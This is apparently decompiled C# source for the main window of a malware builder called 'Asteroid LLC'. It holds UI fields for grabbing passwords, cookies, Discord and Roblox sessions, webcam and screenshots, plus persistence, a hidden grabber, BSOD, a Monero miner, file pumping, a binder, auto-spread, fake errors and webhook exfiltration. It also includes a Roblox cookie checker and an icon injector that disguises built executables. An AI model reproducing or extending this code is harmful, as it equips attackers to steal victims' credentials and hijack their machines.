			this.metroButton3.Theme = 2;
			this.metroButton3.UseSelectable = true;
			this.metroButton3.Click += this.metroButton3_Click;
			this.rblxc.CustomButton.Image = null;
			this.rblxc.CustomButton.Location = new Point(362, 2);
			this.rblxc.CustomButton.Name = "";
			this.rblxc.CustomButton.Size = new Size(17, 17);
			this.rblxc.CustomButton.Style = 4;
			this.rblxc.CustomButton.TabIndex = 1;
			this.rblxc.CustomButton.Theme = 1;
			this.rblxc.CustomButton.UseSelectable = true;
			this.rblxc.CustomButton.Visible = false;
			this.rblxc.ForeColor = Color.White;
			this.rblxc.Lines = new string[0];
			this.rblxc.Location = new Point(21, 20);
			this.rblxc.MaxLength = 32767;
			this.rblxc.Name = "rblxc";
			this.rblxc.PasswordChar = '\0';
			this.rblxc.PromptText = ".ROBLOSECURITY";
			this.rblxc.ScrollBars = ScrollBars.None;
			this.rblxc.SelectedText = "";
			this.rblxc.SelectionLength = 0;
			this.rblxc.SelectionStart = 0;
			this.rblxc.ShortcutsEnabled = true;
			this.rblxc.Size = new Size(382, 22);
			this.rblxc.TabIndex = 74;
			this.rblxc.Theme = 2;
			this.metroToolTip.SetToolTip(this.rblxc, "ROBLOX Cookie to check account");
			this.rblxc.UseSelectable = true;
			this.rblxc.WaterMark = ".ROBLOSECURITY";
			this.rblxc.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.rblxc.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.settingsTab.BorderStyle = BorderStyle.FixedSingle;
			this.settingsTab.Controls.Add(this.groupBox1);
			this.settingsTab.Controls.Add(this.userInfoGroupBox);
			this.settingsTab.HorizontalScrollbarBarColor = true;
			this.settingsTab.HorizontalScrollbarHighlightOnWheel = false;
			this.settingsTab.HorizontalScrollbarSize = 10;
			this.settingsTab.Location = new Point(4, 38);
			this.settingsTab.Name = "settingsTab";
			this.settingsTab.Size = new Size(907, 399);
			this.settingsTab.TabIndex = 3;
			this.settingsTab.Text = "Settings";
			this.settingsTab.Theme = 2;
			this.settingsTab.VerticalScrollbarBarColor = true;
			this.settingsTab.VerticalScrollbarHighlightOnWheel = false;
			this.settingsTab.VerticalScrollbarSize = 10;
			this.groupBox1.BackColor = Color.Transparent;
			this.groupBox1.Controls.Add(this.opacityTrackBar);
			this.groupBox1.Controls.Add(this.stylesComboBox);
			this.groupBox1.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold);
			this.groupBox1.ForeColor = Color.White;
			this.groupBox1.Location = new Point(30, 19);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new Size(419, 144);
			this.groupBox1.TabIndex = 63;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "UI Settings";
			this.opacityTrackBar.BackColor = Color.Transparent;
			this.opacityTrackBar.Location = new Point(21, 92);
			this.opacityTrackBar.Minimum = 5;
			this.opacityTrackBar.Name = "opacityTrackBar";
			this.opacityTrackBar.Size = new Size(375, 23);
			this.opacityTrackBar.TabIndex = 9;
			this.opacityTrackBar.Theme = 2;
			this.opacityTrackBar.ValueChanged += this.opacityTrackBar_ValueChanged;
			this.stylesComboBox.FormattingEnabled = true;
			this.stylesComboBox.ItemHeight = 23;
			this.stylesComboBox.Location = new Point(21, 37);
			this.stylesComboBox.Name = "stylesComboBox";
			this.stylesComboBox.Size = new Size(375, 29);
			this.stylesComboBox.TabIndex = 5;
			this.stylesComboBox.Theme = 2;
			this.stylesComboBox.UseSelectable = true;
			this.stylesComboBox.SelectedIndexChanged += this.colorsComboBox_SelectedIndexChanged;
			this.userInfoGroupBox.BackColor = Color.Transparent;
			this.userInfoGroupBox.Controls.Add(this.userLabel);
			this.userInfoGroupBox.Controls.Add(this.expiryLabel);
			this.userInfoGroupBox.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold);
			this.userInfoGroupBox.ForeColor = Color.White;
			this.userInfoGroupBox.Location = new Point(455, 19);
			this.userInfoGroupBox.Name = "userInfoGroupBox";
			this.userInfoGroupBox.Size = new Size(419, 144);
			this.userInfoGroupBox.TabIndex = 62;
			this.userInfoGroupBox.TabStop = false;
			this.userInfoGroupBox.Text = "User Information";
			this.userLabel.AutoSize = true;
			this.userLabel.FontSize = 2;
			this.userLabel.FontWeight = 1;
			this.userLabel.Location = new Point(21, 37);
			this.userLabel.Name = "userLabel";
			this.userLabel.Size = new Size(95, 25);
			this.userLabel.TabIndex = 3;
			this.userLabel.Text = "Username:";
			this.userLabel.Theme = 2;
			this.expiryLabel.AutoSize = true;
			this.expiryLabel.FontSize = 2;
			this.expiryLabel.FontWeight = 1;
			this.expiryLabel.Location = new Point(21, 90);
			this.expiryLabel.Name = "expiryLabel";
			this.expiryLabel.Size = new Size(103, 25);
			this.expiryLabel.TabIndex = 4;
			this.expiryLabel.Text = "Expire date:";
			this.expiryLabel.Theme = 2;
			this.styleManager.Owner = null;
			this.styleManager.Style = 13;
			this.styleManager.Theme = 2;
			this.txtCookies.CustomButton.Image = null;
			this.txtCookies.CustomButton.Location = new Point(-20, 2);
			this.txtCookies.CustomButton.Name = "";
			this.txtCookies.CustomButton.Size = new Size(17, 17);
			this.txtCookies.CustomButton.Style = 4;
			this.txtCookies.CustomButton.TabIndex = 1;
			this.txtCookies.CustomButton.Theme = 1;
			this.txtCookies.CustomButton.UseSelectable = true;
			this.txtCookies.CustomButton.Visible = false;
			this.txtCookies.Lines = new string[0];
			this.txtCookies.Location = new Point(0, 0);
			this.txtCookies.MaxLength = 32767;
			this.txtCookies.Name = "txtCookies";
			this.txtCookies.PasswordChar = '\0';
			this.txtCookies.ScrollBars = ScrollBars.None;
			this.txtCookies.SelectedText = "";
			this.txtCookies.SelectionLength = 0;
			this.txtCookies.SelectionStart = 0;
			this.txtCookies.ShortcutsEnabled = true;
			this.txtCookies.Size = new Size(0, 22);
			this.txtCookies.TabIndex = 0;
			this.txtCookies.UseSelectable = true;
			this.txtCookies.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.txtCookies.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.txtPasswords.CustomButton.Image = null;
			this.txtPasswords.CustomButton.Location = new Point(-20, 2);
			this.txtPasswords.CustomButton.Name = "";
			this.txtPasswords.CustomButton.Size = new Size(17, 17);
			this.txtPasswords.CustomButton.Style = 4;
			this.txtPasswords.CustomButton.TabIndex = 1;
			this.txtPasswords.CustomButton.Theme = 1;
			this.txtPasswords.CustomButton.UseSelectable = true;
			this.txtPasswords.CustomButton.Visible = false;
			this.txtPasswords.Lines = new string[0];
			this.txtPasswords.Location = new Point(0, 0);
			this.txtPasswords.MaxLength = 32767;
			this.txtPasswords.Name = "txtPasswords";
			this.txtPasswords.PasswordChar = '\0';
			this.txtPasswords.ScrollBars = ScrollBars.None;
			this.txtPasswords.SelectedText = "";
			this.txtPasswords.SelectionLength = 0;
			this.txtPasswords.SelectionStart = 0;
			this.txtPasswords.ShortcutsEnabled = true;
			this.txtPasswords.Size = new Size(0, 22);
			this.txtPasswords.TabIndex = 0;
			this.txtPasswords.UseSelectable = true;
			this.txtPasswords.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.txtPasswords.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.metroToolTip.Style = 4;
			this.metroToolTip.StyleManager = null;
			this.metroToolTip.Theme = 1;
			this.groupBox4.BackColor = Color.Transparent;
			this.groupBox4.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold);
			this.groupBox4.ForeColor = Color.White;
			this.groupBox4.Location = new Point(468, 19);
			this.groupBox4.Name = "groupBox4";
			this.groupBox4.Size = new Size(421, 351);
			this.groupBox4.TabIndex = 64;
			this.groupBox4.TabStop = false;
			this.groupBox4.Text = "Live Control";
			base.AutoScaleMode = AutoScaleMode.None;
			base.ClientSize = new Size(966, 525);
			base.Controls.Add(this.mainTabControl);
			this.Font = new Font("Myanmar Text", 15f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.ForeColor = Color.White;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "MainForm";
			base.Resizable = false;
			base.Style = 0;
			this.Text = "Asteroid LLC";
			base.Theme = 2;
			base.FormClosing += this.MainForm_FormClosing;
			base.Load += this.MainForm_Load;
			this.mainTabControl.ResumeLayout(false);
			this.builderTab.ResumeLayout(false);
			this.metroTabControl2.ResumeLayout(false);
			this.optionsTab.ResumeLayout(false);
			this.optionsTab.PerformLayout();
			this.extraTab.ResumeLayout(false);
			this.extraTab.PerformLayout();
			this.comingSoonPanel3.ResumeLayout(false);
			this.comingSoonPanel3.PerformLayout();
			this.comingSoonPanel2.ResumeLayout(false);
			this.comingSoonPanel2.PerformLayout();
			((ISupportInitialize)this.embedColorPictureBox).EndInit();
			((ISupportInitialize)this.iconPictureBox).EndInit();
			this.pluginsTab.ResumeLayout(false);
			this.pluginTextBox.EndInit();
			this.binderTab.ResumeLayout(false);
			this.compilerTab.ResumeLayout(false);
			this.webhookGroupBox.ResumeLayout(false);
			this.webhookGroupBox.PerformLayout();
			this.metroTabPage2.ResumeLayout(false);
			this.groupBox3.ResumeLayout(false);
			this.groupBox3.PerformLayout();
			this.otherTab.ResumeLayout(false);
			this.groupBox2.ResumeLayout(false);
			this.settingsTab.ResumeLayout(false);
			this.groupBox1.ResumeLayout(false);
			this.userInfoGroupBox.ResumeLayout(false);
			this.userInfoGroupBox.PerformLayout();
			this.styleManager.EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x04000055 RID: 85
		private static string authusername;

		// Token: 0x04000056 RID: 86
		private Random random = new Random();

		// Token: 0x04000057 RID: 87
		private IContainer components;

		// Token: 0x04000058 RID: 88
		private TabPage tabPage1;

		// Token: 0x04000059 RID: 89
		private TabPage tabPage2;

		// Token: 0x0400005A RID: 90
		private MetroTabControl mainTabControl;

		// Token: 0x0400005B RID: 91
		private MetroTabPage builderTab;

		// Token: 0x0400005C RID: 92
		private MetroTextBox errorMessageTextBox;

		// Token: 0x0400005D RID: 93
		private MetroTextBox errorTitleTextBox;

		// Token: 0x0400005E RID: 94
		private MetroCheckBox fakeErrorCheckBox;

		// Token: 0x0400005F RID: 95
		private MetroTabControl metroTabControl2;

		// Token: 0x04000060 RID: 96
		private MetroTabPage optionsTab;

		// Token: 0x04000061 RID: 97
		private MetroTabPage extraTab;

		// Token: 0x04000062 RID: 98
		private MetroTabPage compilerTab;

		// Token: 0x04000063 RID: 99
		private MetroTextBox compilerOutputTextBox;

		// Token: 0x04000064 RID: 100
		private MetroStyleManager styleManager;

		// Token: 0x04000065 RID: 101
		private MetroCheckBox embedColorCheckBox;

		// Token: 0x04000066 RID: 102
		private PictureBox embedColorPictureBox;

		// Token: 0x04000067 RID: 103
		private PictureBox iconPictureBox;

		// Token: 0x04000068 RID: 104
		private MetroCheckBox iconCheckBox;

		// Token: 0x04000069 RID: 105
		private MetroTextBox iconPathTextBox;

		// Token: 0x0400006A RID: 106
		private MetroTextBox pumpAmountTextBox;

		// Token: 0x0400006B RID: 107
		private MetroCheckBox byteCheckBox;

		// Token: 0x0400006C RID: 108
		private MetroCheckBox kiloByteCheckBox;

		// Token: 0x0400006D RID: 109
		private MetroCheckBox filePumperCheckBox;

		// Token: 0x0400006E RID: 110
		private MetroCheckBox megaByteCheckBox;

		// Token: 0x0400006F RID: 111
		private MetroCheckBox autoSpreadCheckBox;

		// Token: 0x04000070 RID: 112
		private MetroTextBox spreadMessage;

		// Token: 0x04000071 RID: 113
		private MetroPanel comingSoonPanel3;

		// Token: 0x04000072 RID: 114
		private MetroPanel comingSoonPanel2;

		// Token: 0x04000073 RID: 115
		private MetroLabel comingSoonLabel3;

		// Token: 0x04000074 RID: 116
		private MetroLabel comingSoonLabel2;

		// Token: 0x04000075 RID: 117
		private MetroButton compileButton;

		// Token: 0x04000076 RID: 118
		private MetroButton chooseIconButton;

		// Token: 0x04000077 RID: 119
		private GroupBox webhookGroupBox;

		// Token: 0x04000078 RID: 120
		private MetroTabPage settingsTab;

		// Token: 0x04000079 RID: 121
		private MetroLabel expiryLabel;

		// Token: 0x0400007A RID: 122
		private MetroLabel userLabel;

		// Token: 0x0400007B RID: 123
		private MetroComboBox stylesComboBox;

		// Token: 0x0400007C RID: 124
		private MetroTextBox txtPasswords;

		// Token: 0x0400007D RID: 125
		private MetroTextBox txtCookies;

		// Token: 0x0400007E RID: 126
		private MetroTextBox poolTextBox;

		// Token: 0x0400007F RID: 127
		private MetroTextBox walletTextBox;

		// Token: 0x04000080 RID: 128
		private MetroCheckBox moneroMinerCheckBox;

		// Token: 0x04000081 RID: 129
		private MetroToolTip metroToolTip;

		// Token: 0x04000082 RID: 130
		private MetroTabPage otherTab;

		// Token: 0x04000083 RID: 131
		private MetroTabPage pluginsTab;

		// Token: 0x04000084 RID: 132
		private ZeroitCodeTextBox pluginTextBox;

		// Token: 0x04000085 RID: 133
		private GroupBox groupBox1;

		// Token: 0x04000086 RID: 134
		private GroupBox userInfoGroupBox;

		// Token: 0x04000087 RID: 135
		private MetroTrackBar opacityTrackBar;

		// Token: 0x04000088 RID: 136
		private SiticoneMetroTrackBar blueTrackBar;

		// Token: 0x04000089 RID: 137
		private SiticoneMetroTrackBar greenTrackBar;

		// Token: 0x0400008A RID: 138
		private SiticoneMetroTrackBar redTrackBar;

		// Token: 0x0400008B RID: 139
		private MetroTabPage binderTab;

		// Token: 0x0400008C RID: 140
		private MetroButton removeButton;

		// Token: 0x0400008D RID: 141
		private ListView filesListView;

		// Token: 0x0400008E RID: 142
		private ColumnHeader fileNameHeader;

		// Token: 0x0400008F RID: 143
		private ColumnHeader fileSizeHeader;

		// Token: 0x04000090 RID: 144
		private MetroButton addButton;

		// Token: 0x04000091 RID: 145
		private MetroTextBox webhookIDbox;

		// Token: 0x04000092 RID: 146
		private MetroButton testWebhookButton;

		// Token: 0x04000093 RID: 147
		private MetroTextBox webhookTextBox;

		// Token: 0x04000094 RID: 148
		private MetroCheckBox wifiCheckBox1;

		// Token: 0x04000095 RID: 149
		private MetroCheckBox copyToTempCheckBox;

		// Token: 0x04000096 RID: 150
		private MetroCheckBox robloxCheckBox;

		// Token: 0x04000097 RID: 151
		private MetroCheckBox cookiesCheckBox;

		// Token: 0x04000098 RID: 152
		private MetroCheckBox disableInputCheckBox;

		// Token: 0x04000099 RID: 153
		private MetroCheckBox cetrainerCheckBox;

		// Token: 0x0400009A RID: 154
		private MetroCheckBox webcamCheckBox;

		// Token: 0x0400009B RID: 155
		private MetroCheckBox screenshotCheckBox;

		// Token: 0x0400009C RID: 156
		private MetroCheckBox discordCheckBox;

		// Token: 0x0400009D RID: 157
		private MetroCheckBox passwordsCheckBox;

		// Token: 0x0400009E RID: 158
		private MetroCheckBox startupCheckBox;

		// Token: 0x0400009F RID: 159
		private MetroCheckBox hideGrabberCheckBox;

		// Token: 0x040000A0 RID: 160
		private MetroCheckBox bsodCheckBox;

		// Token: 0x040000A1 RID: 161
		private MetroCheckBox emailCheckBox1;

		// Token: 0x040000A2 RID: 162
		private MetroCheckBox internetCheckBox1;

		// Token: 0x040000A3 RID: 163
		private MetroTabPage metroTabPage2;

		// Token: 0x040000A4 RID: 164
		private MetroTabControl metroTabControl1;

		// Token: 0x040000A5 RID: 165
		private GroupBox groupBox3;

		// Token: 0x040000A6 RID: 166
		private MetroCheckBox mp4;

		// Token: 0x040000A7 RID: 167
		private MetroCheckBox pdf;

		// Token: 0x040000A8 RID: 168
		private MetroCheckBox txt;

		// Token: 0x040000A9 RID: 169
		private MetroCheckBox png;

		// Token: 0x040000AA RID: 170
		private MetroCheckBox py;

		// Token: 0x040000AB RID: 171
		private MetroTextBox appname;

		// Token: 0x040000AC RID: 172
		private MetroCheckBox rbxl;

		// Token: 0x040000AD RID: 173
		private GroupBox groupBox2;

		// Token: 0x040000AE RID: 174
		private MetroButton metroButton3;

		// Token: 0x040000AF RID: 175
		private MetroTextBox rblxc;

		// Token: 0x040000B0 RID: 176
		private GroupBox groupBox4;

		// Token: 0x02000018 RID: 24
		private class JsonReader
		{
			// Token: 0x17000020 RID: 32
			// (get) Token: 0x060000C4 RID: 196 RVA: 0x0000D5DA File Offset: 0x0000B7DA
			// (set) Token: 0x060000C5 RID: 197 RVA: 0x0000D5E2 File Offset: 0x0000B7E2
			public long UserID { get; set; }

			// Token: 0x17000021 RID: 33
			// (get) Token: 0x060000C6 RID: 198 RVA: 0x0000D5EB File Offset: 0x0000B7EB
			// (set) Token: 0x060000C7 RID: 199 RVA: 0x0000D5F3 File Offset: 0x0000B7F3
			public string UserName { get; set; }

			// Token: 0x17000022 RID: 34
			// (get) Token: 0x060000C8 RID: 200 RVA: 0x0000D5FC File Offset: 0x0000B7FC
			// (set) Token: 0x060000C9 RID: 201 RVA: 0x0000D604 File Offset: 0x0000B804
			public long RobuxBalance { get; set; }

			// Token: 0x17000023 RID: 35
			// (get) Token: 0x060000CA RID: 202 RVA: 0x0000D60D File Offset: 0x0000B80D
			// (set) Token: 0x060000CB RID: 203 RVA: 0x0000D615 File Offset: 0x0000B815
			public bool IsAnyBuildersClubMember { get; set; }

			// Token: 0x17000024 RID: 36
			// (get) Token: 0x060000CC RID: 204 RVA: 0x0000D61E File Offset: 0x0000B81E
			// (set) Token: 0x060000CD RID: 205 RVA: 0x0000D626 File Offset: 0x0000B826
			public string ThumbnailUrl { get; set; }
		}

		// Token: 0x02000019 RID: 25
		public class IconInjector
		{
			// Token: 0x060000CF RID: 207 RVA: 0x0000D62F File Offset: 0x0000B82F
			public static void InjectIcon(string exeFileName, string iconFileName)
			{
				MainForm.IconInjector.InjectIcon(exeFileName, iconFileName, 1U, 1U);
			}

			// Token: 0x060000D0 RID: 208 RVA: 0x0000D63C File Offset: 0x0000B83C
			public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
			{
				MainForm.IconInjector.IconFile iconFile = MainForm.IconInjector.IconFile.FromFile(iconFileName);
				IntPtr hUpdate = MainForm.IconInjector.NativeMethods.BeginUpdateResource(exeFileName, false);
				byte[] array = iconFile.CreateIconGroupData(iconBaseID);
				MainForm.IconInjector.NativeMethods.UpdateResource(hUpdate, new IntPtr(14), new IntPtr((long)((ulong)iconGroupID)), 0, array, array.Length);
				for (int i = 0; i <= iconFile.ImageCount - 1; i++)
				{
					byte[] array2 = iconFile.ImageData(i);
					MainForm.IconInjector.NativeMethods.UpdateResource(hUpdate, new IntPtr(3), new IntPtr((long)((ulong)iconBaseID + (ulong)((long)i))), 0, array2, array2.Length);
				}
				MainForm.IconInjector.NativeMethods.EndUpdateResource(hUpdate, false);
			}

			// Token: 0x0200001A RID: 26
			[SuppressUnmanagedCodeSecurity]
			private class NativeMethods
			{
				// Token: 0x060000D2 RID: 210
				[DllImport("kernel32")]
				public static extern IntPtr BeginUpdateResource(string fileName, [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

				// Token: 0x060000D3 RID: 211
				[DllImport("kernel32")]
				public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

				// Token: 0x060000D4 RID: 212
				[DllImport("kernel32")]
				public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
			}

			// Token: 0x0200001B RID: 27
			private struct ICONDIR
			{
				// Token: 0x040000B6 RID: 182
				public ushort Reserved;

				// Token: 0x040000B7 RID: 183
				public ushort Type;

				// Token: 0x040000B8 RID: 184
				public ushort Count;
			}

			// Token: 0x0200001C RID: 28
			private struct ICONDIRENTRY
			{
				// Token: 0x040000B9 RID: 185
				public byte Width;

				// Token: 0x040000BA RID: 186
				public byte Height;

				// Token: 0x040000BB RID: 187
				public byte ColorCount;

				// Token: 0x040000BC RID: 188
				public byte Reserved;

				// Token: 0x040000BD RID: 189
				public ushort Planes;

				// Token: 0x040000BE RID: 190
				public ushort BitCount;

				// Token: 0x040000BF RID: 191
				public int BytesInRes;

				// Token: 0x040000C0 RID: 192
				public int ImageOffset;
			}

			// Token: 0x0200001D RID: 29
			private struct BITMAPINFOHEADER
			{
				// Token: 0x040000C1 RID: 193
				public uint Size;

				// Token: 0x040000C2 RID: 194
				public int Width;

				// Token: 0x040000C3 RID: 195
				public int Height;

				// Token: 0x040000C4 RID: 196
				public ushort Planes;

				// Token: 0x040000C5 RID: 197
				public ushort BitCount;

				// Token: 0x040000C6 RID: 198
				public uint Compression;

				// Token: 0x040000C7 RID: 199
				public uint SizeImage;

				// Token: 0x040000C8 RID: 200
				public int XPelsPerMeter;

				// Token: 0x040000C9 RID: 201
				public int YPelsPerMeter;

				// Token: 0x040000CA RID: 202
				public uint ClrUsed;

				// Token: 0x040000CB RID: 203
				public uint ClrImportant;
			}

			// Token: 0x0200001E RID: 30
			[StructLayout(LayoutKind.Sequential, Pack = 2)]
			private struct GRPICONDIRENTRY
			{
				// Token: 0x040000CC RID: 204
				public byte Width;

				// Token: 0x040000CD RID: 205
				public byte Height;

				// Token: 0x040000CE RID: 206
				public byte ColorCount;

				// Token: 0x040000CF RID: 207
				public byte Reserved;

				// Token: 0x040000D0 RID: 208
				public ushort Planes;

				// Token: 0x040000D1 RID: 209
				public ushort BitCount;

				// Token: 0x040000D2 RID: 210
				public int BytesInRes;

				// Token: 0x040000D3 RID: 211
				public ushort ID;
			}

			// Token: 0x0200001F RID: 31
			private class IconFile
			{
				// Token: 0x17000025 RID: 37
				// (get) Token: 0x060000D6 RID: 214 RVA: 0x0000D6BC File Offset: 0x0000B8BC
				public int ImageCount
				{
					get
					{
						return (int)this.iconDir.Count;
					}
				}

				// Token: 0x060000D7 RID: 215 RVA: 0x0000D6C9 File Offset: 0x0000B8C9
				public byte[] ImageData(int index)
				{
					return this.iconImage[index];
				}

				// Token: 0x060000D8 RID: 216 RVA: 0x0000D6D4 File Offset: 0x0000B8D4
				public static MainForm.IconInjector.IconFile FromFile(string filename)
				{
					MainForm.IconInjector.IconFile iconFile = new MainForm.IconInjector.IconFile();
					byte[] array = File.ReadAllBytes(filename);
					GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
					iconFile.iconDir = (MainForm.IconInjector.ICONDIR)Marshal.PtrToStructure(gchandle.AddrOfPinnedObject(), typeof(MainForm.IconInjector.ICONDIR));
					iconFile.iconEntry = new MainForm.IconInjector.ICONDIRENTRY[(int)(iconFile.iconDir.Count - 1 + 1)];
					iconFile.iconImage = new byte[(int)(iconFile.iconDir.Count - 1 + 1)][];
					int num = Marshal.SizeOf<MainForm.IconInjector.ICONDIR>(iconFile.iconDir);
					Type typeFromHandle = typeof(MainForm.IconInjector.ICONDIRENTRY);
					int num2 = Marshal.SizeOf(typeFromHandle);
					for (int i = 0; i <= (int)(iconFile.iconDir.Count - 1); i++)
					{
						MainForm.IconInjector.ICONDIRENTRY icondirentry = (MainForm.IconInjector.ICONDIRENTRY)Marshal.PtrToStructure(new IntPtr(gchandle.AddrOfPinnedObject().ToInt64() + (long)num), typeFromHandle);
						iconFile.iconEntry[i] = icondirentry;
						iconFile.iconImage[i] = new byte[icondirentry.BytesInRes - 1 + 1];
						Buffer.BlockCopy(array, icondirentry.ImageOffset, iconFile.iconImage[i], 0, icondirentry.BytesInRes);
						num += num2;
					}
					gchandle.Free();
					return iconFile;
				}

				// Token: 0x060000D9 RID: 217 RVA: 0x0000D804 File Offset: 0x0000BA04
				public byte[] CreateIconGroupData(uint iconBaseID)
				{
					int num = Marshal.SizeOf(typeof(MainForm.IconInjector.ICONDIR)) + Marshal.SizeOf(typeof(MainForm.IconInjector.GRPICONDIRENTRY)) * this.ImageCount;
					byte[] array = new byte[num - 1 + 1];
					GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
					Marshal.StructureToPtr<MainForm.IconInjector.ICONDIR>(this.iconDir, gchandle.AddrOfPinnedObject(), false);
					int num2 = Marshal.SizeOf<MainForm.IconInjector.ICONDIR>(this.iconDir);
					for (int i = 0; i <= this.ImageCount - 1; i++)
					{
						MainForm.IconInjector.GRPICONDIRENTRY structure = default(MainForm.IconInjector.GRPICONDIRENTRY);
						MainForm.IconInjector.BITMAPINFOHEADER bitmapinfoheader = default(MainForm.IconInjector.BITMAPINFOHEADER);
						GCHandle gchandle2 = GCHandle.Alloc(bitmapinfoheader, GCHandleType.Pinned);
						Marshal.Copy(this.ImageData(i), 0, gchandle2.AddrOfPinnedObject(), Marshal.SizeOf(typeof(MainForm.IconInjector.BITMAPINFOHEADER)));
						gchandle2.Free();
						structure.Width = this.iconEntry[i].Width;
						structure.Height = this.iconEntry[i].Height;
						structure.ColorCount = this.iconEntry[i].ColorCount;
						structure.Reserved = this.iconEntry[i].Reserved;
						structure.Planes = bitmapinfoheader.Planes;
						structure.BitCount = bitmapinfoheader.BitCount;
						structure.BytesInRes = this.iconEntry[i].BytesInRes;
						structure.ID = Convert.ToUInt16((long)((ulong)iconBaseID + (ulong)((long)i)));
						Marshal.StructureToPtr<MainForm.IconInjector.GRPICONDIRENTRY>(structure, new IntPtr(gchandle.AddrOfPinnedObject().ToInt64() + (long)num2), false);
						num2 += Marshal.SizeOf(typeof(MainForm.IconInjector.GRPICONDIRENTRY));
					}
					gchandle.Free();
					return array;
				}

				// Token: 0x040000D4 RID: 212
				private MainForm.IconInjector.ICONDIR iconDir;

				// Token: 0x040000D5 RID: 213
				private MainForm.IconInjector.ICONDIRENTRY[] iconEntry;

				// Token: 0x040000D6 RID: 214
				private byte[][] iconImage;
			}
		}
	}
}
